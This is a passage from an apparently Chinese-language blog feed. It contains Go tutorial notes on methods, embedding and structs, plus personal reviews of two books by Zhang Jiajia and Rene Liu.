<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(recv receiver_type)</span> <span class="title">methodName</span><span class="params">(parameter_list)</span> <span class="params">(return_value_list)</span></span> &#123; ... &#125;</div></pre></td></tr></table></figure>
<p>　　<code>receiver_type</code> 叫做 （接收者）基本类型，这个类型必须在和方法同样的包中被声明。在方法名之前，<code>func</code> 关键字之后的括号中指定接收者。示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</div><div class="line">	name   <span class="keyword">string</span></div><div class="line">	number <span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Student)</span> <span class="title">Name</span><span class="params">()</span></span> &#123;	<span class="comment">// 方法</span></div><div class="line">	fmt.Println(s.name)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　接收者类型可以是（几乎）任何类型， 但是接收者不能是一个接口类型，因为接口是一个抽象定义，但是方法却是具体实现。 接收者也不能是一个指针类型，但是它可以是任何其他允许类型的指针。 </p>
<p>　　类型 T（或 <em>T）上的所有方法的集合叫做类型 T（或 </em>T）的方法集。因为方法是函数，所以同样的，不允许方法重载，即对于一个类型只能有一个给定名称的方法。但是如果基于接收者类型，是有重载的：具有同样名字的方法可以在 2 个或多个不同的接收者类型上存在：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Student)</span> <span class="title">Name</span><span class="params">()</span></span> &#123;	<span class="comment">// 接收者为Student</span></div><div class="line">	fmt.Println(s.name)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *School)</span> <span class="title">Name</span><span class="params">()</span></span> &#123;	<span class="comment">// 接收者为School</span></div><div class="line">	fmt.Println(s.name)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h4><p>　　如果 <code>recv</code> 是 <code>receiver</code> 的实例，<code>Method</code> 是它的方法名，那么方法调用遵循传统的 <code>object.name</code> 选择器符号：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">recv.Method()</div></pre></td></tr></table></figure>
<p>　　如果 <code>recv</code> 是一个指针，Go 会自动解引用。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</div><div class="line">	name   <span class="keyword">string</span></div><div class="line">	number <span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Student)</span> <span class="title">Name</span><span class="params">()</span></span> &#123;	<span class="comment">// 方法</span></div><div class="line">	fmt.Println(s.name)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	s1 := Student&#123;<span class="string">"fzy"</span>, <span class="number">11</span>&#125;	<span class="comment">// 值</span></div><div class="line">	s2 := <span class="built_in">new</span>(Student)	<span class="comment">// 指针</span></div><div class="line">	s2.name = <span class="string">"fzy"</span>	<span class="comment">// 赋值</span></div><div class="line">	s2.number = <span class="number">11</span></div><div class="line">	s1.Name()	<span class="comment">// 方法调用</span></div><div class="line">	s2.Name()	<span class="comment">// 方法调用</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">fzy</div><div class="line">fzy</div></pre></td></tr></table></figure>
<h4 id="指针或值作为接收者"><a href="#指针或值作为接收者" class="headerlink" title="指针或值作为接收者"></a>指针或值作为接收者</h4><p>　　鉴于性能的原因，<code>recv</code> 最常见的是一个指向 receiver_type 的指针（因为我们不想要一个实例的拷贝，如果按值调用的话就会是这样），特别是在 receiver 类型是结构体时，就更是如此了。<strong>指针方法和值方法都可以在指针或非指针上被调用：</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</div><div class="line">	name   <span class="keyword">string</span></div><div class="line">	number <span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Student)</span> <span class="title">Name</span><span class="params">()</span></span> &#123;	<span class="comment">// 指针方法</span></div><div class="line">	fmt.Println(s.name)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Student)</span> <span class="title">Number</span><span class="params">()</span></span> &#123;	<span class="comment">// 值方法</span></div><div class="line">	fmt.Println(s.number)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	s1 := Student&#123;<span class="string">"fzy"</span>, <span class="number">11</span>&#125;	<span class="comment">// 值</span></div><div class="line">	s2 := <span class="built_in">new</span>(Student)	<span class="comment">// 指针</span></div><div class="line">	s2.name = <span class="string">"fzy"</span></div><div class="line">	s2.number = <span class="number">11</span></div><div class="line">	s1.Name()	<span class="comment">// 值类型调用指针方法</span></div><div class="line">	s1.Number()	<span class="comment">// 值类型调用值方法</span></div><div class="line">	s2.Name()	<span class="comment">// 指针类型调用指针方法</span></div><div class="line">	s2.Number()	<span class="comment">// 指针类型调用值方法</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="函数与方法的区别"><a href="#函数与方法的区别" class="headerlink" title="函数与方法的区别"></a>函数与方法的区别</h4><ul>
<li>函数将变量作为参数：<code>Function(recv)</code></li>
<li>方法在变量上被调用：<code>recv.Method()</code></li>
<li>在接收者是指针时，方法可以改变接收者的值（或状态），当参数作为指针传递，即通过引用调用时，函数也可以改变参数的状态。</li>
<li>接收者必须有一个显式的名字，这个名字必须在方法中被使用。而函数的参数则可以没有显式的名字，并且不一定要在函数中使用。</li>
</ul>
<h4 id="Get-和-Set-方法"><a href="#Get-和-Set-方法" class="headerlink" title="Get 和 Set 方法"></a>Get 和 Set 方法</h4><p>　　可以通过面向对象语言一个众所周知的技术：提供 <code>getter</code> 和 <code>setter</code> 方法，来实现对未导出字段的访问。在 Go 语言中，对于 <code>setter</code> 方法使用 <code>Set</code> 前缀，对于 <code>getter</code> 方法只使用成员名。</p>
<p>　　例如，在下面的程序中，<code>person</code> 包中定义了 <code>Person</code> 结构体，由于首字母大写，是可以被外部包调用的，但是其中的字段都是小写字母开头，所以并不能被访问。此时，就需要提供 <code>getter</code> 和 <code>setter</code> 方法：</p>
<p>　　person/person.go：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> person</div><div class="line"></div><div class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;	<span class="comment">// 外部可见</span></div><div class="line">	name <span class="keyword">string</span>	<span class="comment">// 外部不可见</span></div><div class="line">	age  <span class="keyword">int</span>	<span class="comment">// 外部不可见</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Person)</span> <span class="title">Name</span><span class="params">()</span> <span class="title">string</span></span> &#123;	<span class="comment">// getter</span></div><div class="line">	<span class="keyword">return</span> p.name</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Person)</span> <span class="title">SetName</span><span class="params">(newName <span class="keyword">string</span>)</span></span> &#123;	<span class="comment">// setter</span></div><div class="line">	p.name = newName</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Person)</span> <span class="title">Age</span><span class="params">()</span> <span class="title">int</span></span> &#123;	<span class="comment">// getter</span></div><div class="line">	<span class="keyword">return</span> p.age</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Person)</span> <span class="title">SetAge</span><span class="params">(newAge <span class="keyword">int</span>)</span></span> &#123;	<span class="comment">// setter</span></div><div class="line">	p.age = newAge</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　main.go：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"person"</span>	<span class="comment">// 导包</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	p := <span class="built_in">new</span>(person.Person)	<span class="comment">// 使用外部包类型</span></div><div class="line">	p.SetName(<span class="string">"fzy"</span>)</div><div class="line">	p.SetAge(<span class="number">23</span>)</div><div class="line">	fmt.Println(p.Name(), p.Age())	<span class="comment">// 调用外部包的方法</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="继承与多重继承"><a href="#继承与多重继承" class="headerlink" title="继承与多重继承"></a>继承与多重继承</h4><p>　　当一个匿名类型被内嵌在结构体中时，匿名类型的可见方法也同样被内嵌，这在效果上等同于外层类型 <strong>继承</strong> 了这些方法：<strong>将父类型放在子类型中来实现亚型</strong>。</p>
<p>　　内嵌将一个已存在类型的字段和方法注入到了另一个类型里：匿名字段上的方法“晋升”成为了外层类型的方法。当然类型可以有只作用于本身实例而不作用于内嵌“父”类型上的方法，可以覆写方法（像字段一样）：和内嵌类型方法具有同样名字的外层类型的方法会覆写内嵌类型对应的方法。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</div><div class="line">	Person	<span class="comment">// 内嵌，继承</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</div><div class="line">	name   <span class="keyword">string</span></div><div class="line">	number <span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(P *Person)</span> <span class="title">Name</span><span class="params">()</span></span> &#123;</div><div class="line">	fmt.Println(<span class="string">"Person: "</span>, P.name)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Student)</span> <span class="title">Name</span><span class="params">()</span></span> &#123;	<span class="comment">// 覆写Name方法</span></div><div class="line">	fmt.Println(<span class="string">"Student: "</span>, s.name)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	s := Student&#123;Person&#123;<span class="string">"fzy"</span>, <span class="number">11</span>&#125;&#125;</div><div class="line">	s.Name() <span class="comment">// 调用的是接收者为Student的Name方法</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Student:  fzy</div></pre></td></tr></table></figure>
<p>　　多重继承指的是类型获得多个父类型行为的能力，它在传统的面向对象语言中通常是不被实现的（C++ 和 Python 例外）。因为在类继承层次中，多重继承会给编译器引入额外的复杂度。但是在 Go 语言中，通过在类型中嵌入所有必要的父类型，可以很简单的实现多重继承。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</div><div class="line">	name <span class="keyword">string</span></div><div class="line">	age  <span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> School <span class="keyword">struct</span> &#123;</div><div class="line">	names <span class="keyword">string</span></div><div class="line">	id    <span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;	<span class="comment">// 继承Person，又继承School</span></div><div class="line">	Person</div><div class="line">	School</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(P *Person)</span> <span class="title">Name</span><span class="params">()</span></span> &#123;	<span class="comment">// Person的方法</span></div><div class="line">	fmt.Println(P.name)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *School)</span> <span class="title">Names</span><span class="params">()</span></span> &#123;	<span class="comment">// School的方法</span></div><div class="line">	fmt.Println(s.names)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	s := Student&#123;Person&#123;<span class="string">"fzy"</span>, <span class="number">11</span>&#125;, School&#123;<span class="string">"csu"</span>, <span class="number">111</span>&#125;&#125;</div><div class="line">	s.Name() <span class="comment">// 内嵌结构体上的方法可以直接在外层类型的实例</span></div><div class="line">	s.Names()</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">fzy</div><div class="line">csu</div></pre></td></tr></table></figure>
<p>　　上面的例子中，定义了三个结构体，并实现了一些方法，结构体 <code>Student</code> 继承了 <code>Person</code> 和 <code>School</code> 结构体，然后也就可以调用 <code>Person</code> 和 <code>School</code> 的方法。</p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>从你的全世界路过</title>
    <url>/2018/09/01/%E4%BB%8E%E4%BD%A0%E7%9A%84%E5%85%A8%E4%B8%96%E7%95%8C%E8%B7%AF%E8%BF%87/</url>
    <content><![CDATA[<center>故事的开始总是这样，适逢其时，猝不及防。</center>

<center>故事的结果总是这样，花开两朵，天各一方。</center>



<a id="more"></a>
<p>　　《从你的全世界路过》是一本销量惊人，但是评分不高的书。张嘉佳以自己在微博上所讲的33个真实的爱情故事而总结编著成的爱情小说。知道张嘉佳这个人是在2016年的电影《从你的全世界路过》，这不是一部烂片，但也不是一部优秀的电影，仿佛就是张嘉佳在给我们讲故事。现在看来，电影里都是《从你的全世界路过》书里的感觉。一本看似纷杂凌乱的的睡前故事，但里面的故事却有条不紊的向你描述着人生的点点滴滴，仿佛就像在写你自己，又像是朋友在深夜跟你在叙述，讲诉他走过的人生经历。利用暑假的时间，断断续续读了两遍，即使是睡前故事，也是温暖如初。很多人觉得这很矫情，其实，我以前也很反感这样的作品。但是，书中的每个故事都那么有温度，而不是充斥着不知所云的堕落。至少，爱情这个主题还是美好的。</p>
<p>　　这本书以讲故事的方式，讲述了33个真实发生过的爱情故事。从书中可以看到很多张嘉佳生活的痕迹，但是故事的真实与否，我个人也有所质疑。毕竟，在这些睡前小故事里，有很多我们青春里难以理解的行为，很多疯狂的事迹。每个故事都是有温度的，但是作者要有如此丰富的生活阅历，如此疯狂的青春，拥有那么多奇奇怪怪的朋友，我觉得确实不太容易，</p>
<p>　　确实有很多人不喜欢这本书，觉得书中的人物都很作，也确实是很作了，他们大多不务正义，虚度人生。但是，这本书的定位是睡前故事，睡觉前看的故事，看了会让人觉得温暖。所以，我也不去与那些整日鸡汤为伴，生活充满激情，无法接受这样颓废生活的人争论这本书的好坏。虽然自己也不是特别欣赏这样的生活，但是谁的人生没有经历过迷茫甚至是颓废，或多或少在书中也能看到一点自己的影子。另外，在这些小故事里也有一些自己不曾经历过的温暖或感动，甚至自己也想要追求的小感动。睡前故事大致就是这样的吧，像是深夜电台节目中讲的故事一样，往往只有懂得的人才会觉得可贵。</p>
<p>　　生活其实是一面镜子，照出来的是你自己，书也是。最好的评价是自己看一遍，看看有多少共鸣。如果你明知道故事是假的，还被感动甚至掉眼泪，想必你也曾几何时的某个瞬间是或者想成为这样的人吧。不管是自己经历过的，还是心里想要的，这本书能够给你这样的东西就足够了。相信很多人也经历过这本书中类似的事情，虽然不及书中的疯狂，但是当时的心情大抵应该是类似的，所以很喜欢张嘉佳这样的风格。</p>
<p>　　不想参杂太多的个人情感在博客中，还是分享一些书中那些有意思的文字：</p>
<ul>
<li>一个人的记忆就是一座城市，时间腐蚀着一切建筑，把高楼和道路全部沙化。如果你不往前走，就会被沙子掩埋。所以我们泪流满面，步步回头，可能只能往前走。——《从你的全世界路过》</li>
<li>“十年醉了太多次，身边换了很多人，桌上换过很多菜，杯里洒过很多酒。那是最骄傲的我们，那是最浪漫的我们，那是最无所顾忌的我们。 那是我们光芒万丈的青春。 如果可以，无论要去哪里，剩下的碳烤生蚝请让我打包。 ——《猪头的爱情》</li>
<li>我知道自己喜欢你，但我不知道自己的将来在哪里，因为我知道，无论哪里，我都没法带你去。而记忆打亮你的微笑，要如此用力才变得欢喜。 ——《河面下的少年》</li>
<li>我希望有个如你一般的人。 如这山间清晨一般明亮清爽的人， 如奔赴古城道路上阳光一般的人， 温暖而不炙热，覆盖我所有肌肤。 由起点到夜晚，由山野到书房， 一切问题的答案都很简单。我希望有个如你一般的人，贯彻未来，数遍生命的公路牌。——《我希望有个如你一般的人》</li>
<li>我们常说，轻易得来的。不会懂得珍惜。其实不然，轻易得来的。你会害怕失去。 因为自己挣来的，更可贵的是你获得它的能力。而从他人处攫来的，你会恐惧失去，一心想要牢牢把握在手中。 ——《生鲜小龙虾的爱情》</li>
<li>在季节的列车上，如果你要提前下车，请别推醒装睡的我。这样我可以沉睡到终点，假装不知道你已离开。—–《最容易丢的东西》</li>
<li>四季总是有一次凋零，结果无数次凋零。相爱总是有一次分离，结果无数次分离。—–《姐姐》</li>
<li>世事如书，我偏爰你这一句，愿做个逗号，呆在你脚边。但你有自己的朗读者，而我只是个摆渡人。—–《摆渡人》</li>
<li>……</li>
</ul>
<p>　　都说，一个人太久了，就开始渴盼爱情，好像有那么一个能够矢志不渝陪伴在身边的另一个，就真能融入骨血，温暖自我。希望你们也有这样适逢其时、过程精彩、结局美好的爱情故事。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>我敢在你怀里孤独</title>
    <url>/2018/08/31/%E6%88%91%E6%95%A2%E5%9C%A8%E4%BD%A0%E6%80%80%E9%87%8C%E5%AD%A4%E7%8B%AC/</url>
    <content><![CDATA[<p>　　世界这么大，你我这么小。我们该如何独处与相处？</p>
<a id="more"></a>
<p>　　叔本华曾经说过，“要么孤独，要么庸俗”。</p>
<p>　　朋友给我推荐了刘若英的这本《我敢在你怀里孤独》，当时很惊讶，奶茶也写书吗？查了一下，咦，她好像已经写过好几本书了，惭愧惭愧。在微信读书上预览了这本书的前面一章，然后果断下单购买了纸质书。</p>
<p>　　“我敢在你怀里孤独。因为保有你，我感觉幸福，同时保有自己，所以能安心自由”，这是刘若英对于书名的解释。关于书名，很多人会觉得有点作，网络上也有很多关于书名的讨论，我倒觉得没有必要，明白就行，何必抠字眼。另外，对于书籍，我也不太关注书的评分，因为不同的人喜欢的书不一样，需要的读物也大有不同，所以别人的点评不具有太大的参考意义。有时候，我们读书，不过是想要在书中寻找自己的影子，又或是寻找自己想要成为的样子。</p>
<p>　　初次看这本书，才发现自己对奶茶其实并不了解，以前也没有特别喜欢过她，但是她的歌声却经常在耳边响起。于是乎，开始寻找那些未知的答案。刘若英的成名史可谓是十分励志了，从制作助理到歌手、演员、导演、词曲创作者，了解最多的应该是她的歌曲。有时候，会感慨怎么会有这么了不起的艺人，唱歌、演戏、摄影、写作样样在行。今年，还去看了她拍的电影《后来的我们》，没有想象中好，但是也值得肯定。</p>
<p>　　书的前半段是刘若英的自述，从书中了解到，她不仅一直保留着自己独处的空间，也很懂得如何与他人相处。当然，她对于独处的一些做法我并不是完全认同，特别是她和先生的相处方式。比如他们两个人回家一个向左走一个向右走，彼此都在独立的书房中工作，即使在一个房间，她也会找一个距离较远的角落；又比如有时她跟先生出去吃饭，在上菜前的一段时间里，先生头也不抬的玩着手机，而她却敏感而好奇的观察着身边的人。虽然说，两个人在一起最舒服的状态就是不说话也不觉得尴尬，能说话就很开心，彼此不可缺少但又给对方足够的自由，但是总感觉像奶茶描述的这样的夫妻关系没有想象的好，有时候还会觉得奶茶有些刻意去做一些事情，总觉得有点陌生。不过，每个人喜欢的方式不一样，这个也应该理解，只是个人不太认同罢了。</p>
<p>　　书的后半部分是奶茶与八位朋友（卢广仲、五月天玛莎、陈绮贞、林奕华、宋冬野、王浩威、五月天石头、詹仁雄）的对白，在一个阳光明媚的午后，约上好友喝喝咖啡，然后悠闲自在地聊聊天，主要聊的是好友们对“孤独”的看法，简单的对白却十分有趣的。从这本书中看到了不太了解的明星的生活，包括我喜欢的陈绮贞，虽然可能并不是那么真实，但是了解到他们对于独处的一些探讨。在与陈绮贞的对白中，陈绮贞认为离开网络与社群，某种程度就是一种独处。她还说，人的一生中不是在争取自己的空间就是在适应别人的空间。以及，能够一个人生活得很好以后，才能更好地与别人生活在一起，等等，这些都是陈绮贞式的感悟。奶茶与他们探讨“孤独力”，清晰地看到了孤独的本来面目——孤独可以是一种力量，而非阻力，耐得住就可以看透生活很多迷障。</p>
<p>　　进行着相处训练的奶茶与进行着独处训练的五月天的石头，他们互相像是探索着对方的领域一样，充满好奇与新发现。其实，人生的不同阶段就会需要学会处于不同的状态，需要去学会相处，也会需要去学会独处。而处于不同状态，或者说对于独处或相处更有经验的两个人，互相的交流会很有价值。在奶茶与王浩威的对白中，王浩威从心理学的角度诠释孤独力是情感高度成熟的指标，并且引用奥修的话：“有独处的能力，才有爱的能力。意思就是说，只要那些有能力独处的人，才有能力去爱，去走进一个人内心深处，而不会急着占有对方，成为对方的依赖。因为知道即使对方离开了，自己还是可以一样快乐，因为快乐不是对方给予才有的。</p>
<p>　　书中能引起共鸣的地方有很多，不仅是上面提到的那些经典的语句，还有对白中相似的成长背景和生活经历。寂寞是一种负面情绪，而孤独是一种状态，掌握与自己的相处之道，才能更好地与他人相处，有独处的能力，才有爱的能力。再分享一些书中比较有意思的句子：</p>
<ul>
<li>我常常觉得，孤独感是与生俱来的，不是因为你是一个人，所以必定孤独，或因为有人相伴，所以圆满。孤独感对我来说并不意味着痛苦，那只是一种自己跟自己相处的状态。</li>
<li>孤独是一种状态，寂寞则是一种负面情绪。</li>
<li>当我发现我是孤独的时候，反而是种很好的状态，孤独可以让你更强壮。</li>
<li>那些人眼中我的“孤僻”，在我的世界里，只是珍惜并坚持那微弱的任性罢了。</li>
<li>发生过的事，即使被遗忘，也不会消失。</li>
<li>面对家人的事，再怎么累，再怎么烦，也得耐着性子好好处理。毕竟这是人生中无法躲避的相处。</li>
<li>相处就像把两个独处放在一起。在一起的时候像黏土，可以形塑成两个人以外的第三种样貌；分开的时候像磁铁，彼此相吸又各自独立。</li>
<li>感情的世界没有输赢，只有谁更无法失去谁。</li>
<li>身体可以老，冲动不能没有。</li>
<li>真正成熟美好的关系是—-即使两人暂时无话可说也无所谓，相对无言就暂时沉默，可以静静地躺在对方怀里孤独，这是两人互相信任的极致表现，也是最高境界。</li>
</ul>
<p>　　看完这本书以后，我也像刘若英一样，和我的好友进行了对话，问问他们关于独处的看法。认真的交谈以后，你会发现一个你完全不了解的他/她。</p>
<p>　　分享一下我和一个特别聊得来的朋友的对话吧。她说她越来越喜欢或者是习惯独处，因为越来越不喜欢交际、越来越孤独。但是，让我没有想到的是，独处对于她来说竟然那么重要。你不曾想到，在这些孤独的时光里，她做了什么。她会为了一个想要的职位，利用周末去咖啡馆找个安静的卡座学习西班牙语，也会因为工作需要带上笔记本看视频学习 工作技能。学这些都需要很好地环境，而在我的认知里，咖啡馆并不是一个很好地选择，毕竟还是一个公共场合。她说，在家会想吃东西喝东西，甚至会很困，然后倒头就睡，而在外面会注意自己的形象，所以她会选择到咖啡馆找一个安静的角落，一个人坚持去做好一些事情。其实，你会发现，真正会独处的人往往很享受这样的时光。不用担心太多，这个时间段只属于你自己，不管是放松还是为了未来在一点点积累，我想，坚持下来，这都是美好的。</p>
<p>　　都说，那些有能力独处的人，才有能力去爱、去分享、去走入另一个人内心的最深处。突然，有点羡慕、佩服这样的你们。回顾过去，我也是一个能耐得住寂寞，也能在喧闹中玩耍的人。不过，后来为了那些所谓的未来，逐渐迷失了自我，越来越喜欢在人群中寻找快乐，独处能力渐渐退化。关于独处和相处，自己还是有很多需要学习的地方，希望以后可以像你们一样，把独处与相处都处理得很好。</p>
<p>　　人生是一段有去无回的旅行，只能充满着好奇一步步的走下去。当然会有海浪，当然会有黑夜，即便我们能欣赏她的美，也会有孤单，还怕不被了解的时候。希望，你们不管是自处还是相处，都能找到合适的角度与姿态欣赏眼前的风景，然后把遇到的事情分享给身边的人。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-结构体</title>
    <url>/2018/08/30/Golang%20%E7%AC%94%E8%AE%B0-%E7%BB%93%E6%9E%84%E4%BD%93/</url>
    <content><![CDATA[<center>Golang 结构体学习。</center>



<a id="more"></a>
<p>　　结构体将多个不同类型命名字段序列打包成一个复合类型，每个字段叫做结构体的成员。在 Go 语言中，结构体就像是类的一种简化形式 。</p>
<p>　　Go 语言中，结构体和它所包含的数据在内存中是以连续块的形式存在的，即使结构体中嵌套有其他的结构体，这在性能上带来了很大的优势。不像 Java 中的引用类型，一个对象和它里面包含的对象可能会在不同的内存空间中，这点和 Go 语言中的指针很像。</p>
<h4 id="定义与初始化"><a href="#定义与初始化" class="headerlink" title="定义与初始化"></a>定义与初始化</h4><p>　　结构体定义需要使用 <code>type</code> 和 <code>struct</code> 关键字。<code>struct</code> 关键字定义一个新的数据类型，结构体有中有一个或多个成员。<code>type</code> 关键字设定了结构体的名称。结构体的格式如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> identifier <span class="keyword">struct</span> &#123;</div><div class="line">    field1 type1</div><div class="line">    field2 type2</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　结构体的字段可以是任何类型，甚至是结构体本身，也可以是函数或者接口。例如：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</div><div class="line">	name <span class="keyword">string</span> <span class="string">"name field"</span>    <span class="comment">// 标签</span></div><div class="line">	age  <span class="keyword">int</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　结构体中的字段除了有名字和类型外，还可以有一个可选的标签（tag）：它是一个附属于字段的字符串，可以是文档或其他的重要标记。标签的内容不可以在一般的编程中使用，只有包 <code>reflect</code> 能获取它。</p>
<p>　　使用 <code>new()</code> 函数给一个新的结构体变量分配内存，它返回指向已分配内存的指针：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> p *Person = <span class="built_in">new</span>(Person)</div></pre></td></tr></table></figure>
<p>　　惯用方法是：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">t := <span class="built_in">new</span>(Person)</div></pre></td></tr></table></figure>
<p>　　变量 <code>t</code> 是一个指向 <code>T</code>的指针，此时结构体字段的值是它们所属类型的零值。 声明 <code>var t T</code> 也会给 <code>t</code> 分配内存，并零值化内存，但是这个时候 <code>t</code> 是类型T。在这两种方式中，<code>t</code> 通常被称做类型 T 的一个实例（instance）或对象（object）。 初始化一个结构体实例的更简短和惯用的方式如下： </p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">p := &amp;Person&#123;<span class="string">"fzy"</span>, <span class="number">23</span>&#125;	<span class="comment">// 此时p的类型是 *Person</span></div></pre></td></tr></table></figure>
<p>　　或者：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> p Person</div><div class="line">p = Person&#123;<span class="string">"fzy"</span>, <span class="number">23</span>&#125;</div></pre></td></tr></table></figure>
<p>　　这种简写方式底层仍然会调用 <code>new ()</code>，这里值的顺序必须按照字段顺序来写。当然，也可以通过在值的前面放上字段名来初始化字段的方式，这样就可以不按顺序：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">p := &amp;Person&#123;age: <span class="number">23</span>, name: <span class="string">"fzy"</span>&#125;</div></pre></td></tr></table></figure>
<p>　　表达式 <code>new(Type)</code> 和 <code>&amp;Type{}</code> 是等价的。 </p>
<ul>
<li><p>使用 new 初始化：</p>
<p><img src="https://github.com/Unknwon/the-way-to-go_ZH_CN/blob/master/eBook/images/10.1_fig10.1-1.jpg?raw=true" alt="new"></p>
</li>
<li><p>作为结构体字面量初始化： </p>
</li>
</ul>
<p><img src="https://github.com/Unknwon/the-way-to-go_ZH_CN/blob/master/eBook/images/10.1_fig10.1-2.jpg?raw=true" alt=""></p>
<h4 id="成员访问与赋值"><a href="#成员访问与赋值" class="headerlink" title="成员访问与赋值"></a>成员访问与赋值</h4><p>　　访问结构体成员，需要使用点号 . 操作符，在 Go 语言中这叫 <strong>选择器（selector）</strong>。无论变量是一个结构体类型还是一个结构体类型指针，都使用同样的 <strong>选择器符（selector-notation）</strong> 来访问结构体的字段并赋值：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</div><div class="line">    name <span class="keyword">string</span></div><div class="line">    age  <span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">    p := <span class="built_in">new</span>(Person)</div><div class="line">    p.name = <span class="string">"fzy"</span>	<span class="comment">// 访问并赋值</span></div><div class="line">    p.age = <span class="number">23</span></div><div class="line">    fmt.Println(p.name, p.age)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
